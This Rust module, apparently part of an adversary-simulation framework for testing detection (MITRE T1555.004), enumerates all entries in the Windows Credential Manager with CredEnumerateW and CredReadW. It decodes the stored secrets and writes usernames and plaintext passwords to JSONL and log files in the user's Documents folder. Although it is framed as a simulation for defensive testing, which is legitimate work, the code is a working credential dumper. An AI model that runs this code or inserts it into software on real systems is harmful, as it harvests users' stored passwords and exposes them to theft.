//! This module enumerates credentials in the Windows Credential Manager (T1555.004)

use anyhow::{Context, Result};
use chrono::Utc;
use serde::Serialize;
use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;
use std::ptr::null_mut;
use std::io::Write;

use windows::{
    core::PCWSTR,
    Win32::Security::Credentials::{
        CredEnumerateW, CredFree, CredReadW, CREDENTIALW, CRED_ENUMERATE_FLAGS,
    },
};

use crate::core::config::Config;
use crate::core::simulation::Simulation;
use crate::core::logger;
use crate::core::telemetry::{ActionRecord, write_action_record};
use dirs::home_dir;
use std::fs::{create_dir_all, OpenOptions};


/// Telemetry struct
#[derive(Serialize)]
struct CredEnumTelemetry {
    test_id: String,
    timestamp: String,
    count: u32,
    parent: String,
    elapsed_ms: u128,
    details: Vec<CredEntry>,
}

#[derive(Serialize)]
struct CredEntry {
    target: String,
    cred_type: u32,
    username: Option<String>,
    secret: Option<String>,
    is_utf8: bool,
}

#[derive(Default)]
pub struct CredManagerSimulation;

impl CredManagerSimulation {

    /// Convert PWSTR → Rust String
    fn pwstr_to_string(p: PCWSTR) -> String {
        if p.is_null() {
            return String::new();
        }

        unsafe {
            let mut len = 0;
            while *p.0.offset(len) != 0 {
                len += 1;
            }

            let slice = std::slice::from_raw_parts(p.0, len as usize);
            OsString::from_wide(slice).to_string_lossy().into_owned()
        }
    }

    /// Path: %USERPROFILE%\Documents\MagnetTelemetry
    fn telemetry_dir() -> Option<std::path::PathBuf> {
        home_dir().map(|mut p| {
            p.push("Documents");
            p.push("MagnetTelemetry");
            p
        })
    }

    /// Mirror of PA's logging/telemetry format
    fn write_detailed_telemetry(cfg: &Config, t: &CredEnumTelemetry) -> Result<()> {
        let dir = Self::telemetry_dir()
            .ok_or_else(|| anyhow::anyhow!("could not determine telemetry path"))?;

        create_dir_all(&dir)
            .with_context(|| format!("creating telemetry directory {}", dir.display()))?;

        //
        // JSONL output
        //
        let mut jsonl = dir.clone();
        jsonl.push(format!("cred_manager_{}.jsonl", cfg.test_id));

        let mut jf = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&jsonl)
            .with_context(|| format!("opening telemetry file {}", jsonl.display()))?;

        writeln!(jf, "{}", serde_json::to_string(t)?)?;

        //
        // Human-readable LOG
        //
        let mut log = dir.clone();
        log.push(format!("cred_manager_{}.log", cfg.test_id));

        let mut lf = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&log)
            .with_context(|| format!("opening log file {}", log.display()))?;

        writeln!(lf, "================================================================")?;
        writeln!(lf, "TEST ID   : {}", t.test_id)?;
        writeln!(lf, "TIMESTAMP : {}", t.timestamp)?;
        writeln!(lf, "COUNT     : {}", t.count)?;
        writeln!(lf, "PARENT    : {}", t.parent)?;
        writeln!(lf, "ELAPSED_MS: {}", t.elapsed_ms)?;
        writeln!(lf, "================================================================")?;
        writeln!(lf, "CREDENTIAL DETAILS")?;
        writeln!(lf, "================================================================")?;

        for (i, c) in t.details.iter().enumerate() {
            writeln!(lf, "\n--- Credential {} ---", i + 1)?;
            writeln!(lf, "Target     : {}", c.target)?;
            writeln!(lf, "Type       : {}", c.cred_type)?;

            match &c.username {
                Some(u) => writeln!(lf, "Username   : {}", u)?,
                None => writeln!(lf, "Username   : <none>")?,
            }

            match &c.secret {
                Some(s) => writeln!(lf, "Secret     : {}", s)?,
                None => writeln!(lf, "Secret     : <none>")?,
            }

            writeln!(lf, "UTF-8 Blob : {}", c.is_utf8)?;
        }

        writeln!(lf)?;
        writeln!(lf, "================================================================")?;
        writeln!(lf, "END OF LOG")?;
        writeln!(lf, "================================================================")?;

        Ok(())
    }
} // <-- End of impl CredManagerSimulation (correctly closed!)



impl Simulation for CredManagerSimulation {

    fn name(&self) -> &'static str {
        "windows::cred_manager_access"
    }

    fn run(&self, cfg: &Config) -> Result<()> {
        logger::action_running("Enumerating Windows stored credentials");

        let start = std::time::Instant::now();

        let mut count: u32 = 0;
        let mut creds_ptr: *mut *mut CREDENTIALW = null_mut();

        // must be outside unsafe
        let mut entries: Vec<CredEntry> = Vec::new();

        unsafe {
            //
            // Enumerate credentials
            //
            let result = CredEnumerateW(
                None,
                CRED_ENUMERATE_FLAGS(0),
                &mut count,
                &mut creds_ptr,
            );

            if let Err(e) = result {
                logger::action_fail("CredEnumerateW failed");

                let rec = ActionRecord {
                    test_id: cfg.test_id.clone(),
                    timestamp: Utc::now().to_rfc3339(),
                    action: format!("T1555.004 - {}", self.name()),
                    status: "failed".into(),
                    details: format!("CredEnumerateW error: {:?}", e),
                    artifact_path: None,
                };
                let _ = write_action_record(cfg, &rec);

                return Err(anyhow::anyhow!("CredEnumerateW failed: {:?}", e));
            }

            logger::info(&format!("found {} credentials", count));

            let creds_slice = std::slice::from_raw_parts(creds_ptr, count as usize);

            //
            // Process each credential
            //
            for &cred_ptr in creds_slice {
                let cred = &*cred_ptr;

                let target = Self::pwstr_to_string(PCWSTR(cred.TargetName.0));
                let cred_type = cred.Type;

                // Attempt read
                let mut read_ptr: *mut CREDENTIALW = null_mut();
                let read_result = CredReadW(
                    PCWSTR(cred.TargetName.0),
                    cred.Type,
                    0,
                    &mut read_ptr,
                );

                let (username, secret, is_utf8) =
                    if let Ok(_) = read_result {
                        let full = &*read_ptr;

                        let user = Self::pwstr_to_string(PCWSTR(full.UserName.0));

                        let size = full.CredentialBlobSize as usize;
                        let ptr = full.CredentialBlob;

                        let parsed = if ptr.is_null() || size == 0 {
                            (Some(user), None, true)
                        } else {
                            let bytes = std::slice::from_raw_parts(ptr, size);
                            match std::str::from_utf8(bytes) {
                                Ok(s) => (Some(user), Some(s.to_string()), true),
                                Err(_) => (Some(user), Some("<non-UTF8 binary data>".into()), false),
                            }
                        };

                        CredFree(read_ptr as _);
                        parsed
                    } else {
                        (None, Some("<access denied or system credential>".into()), true)
                    };

                entries.push(CredEntry {
                    target,
                    cred_type: cred_type.0,
                    username,
                    secret,
                    is_utf8,
                });
            }

            CredFree(creds_ptr as _);
        }

        logger::action_ok();

        //
        // TELEMETRY
        //
        let elapsed = start.elapsed();
        let parent = std::env::current_exe()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|_| "<unknown>".to_string());

        let telem = CredEnumTelemetry {
            test_id: cfg.test_id.clone(),
            timestamp: Utc::now().to_rfc3339(),
            count,
            parent,
            elapsed_ms: elapsed.as_millis(),
            details: entries,
        };

        if let Err(e) = Self::write_detailed_telemetry(cfg, &telem) {
            logger::warn(&format!("failed to write detailed telemetry: {}", e));
        }

        //
        // ACTION RECORD
        //
        let rec = ActionRecord {
            test_id: cfg.test_id.clone(),
            timestamp: Utc::now().to_rfc3339(),
            action: format!("T1555.004 - {}", self.name()),
            status: "written".into(),
            details: format!("Enumerated {} credentials", count),
            artifact_path: None,
        };

        if let Err(e) = write_action_record(cfg, &rec) {
            logger::warn(&format!("failed to write action record: {}", e));
        }

        Ok(())
    }
}
